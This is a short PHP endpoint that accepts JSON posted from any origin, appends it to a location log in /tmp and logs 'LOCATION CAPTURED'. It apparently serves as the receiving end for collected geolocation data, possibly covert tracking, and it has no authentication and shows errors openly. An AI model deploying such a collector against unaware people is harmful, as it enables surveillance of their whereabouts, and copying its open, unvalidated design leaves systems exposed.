<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");
error_reporting(E_ALL);
ini_set('display_errors', 1);

$logFile = '/tmp/locations.log'; // 100% writable location

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true) ?: [];
    
    // Atomic write operation
    file_put_contents($logFile, print_r($data, true)."\n", FILE_APPEND | LOCK_EX);
    
    // Immediate flush to disk
    fflush(fopen($logFile, 'a'));
    
    error_log("LOCATION CAPTURED: ".$input);
    die(json_encode(['status' => 'success']));
}

http_response_code(405);
die(json_encode(['error' => 'Method not allowed']));
?>
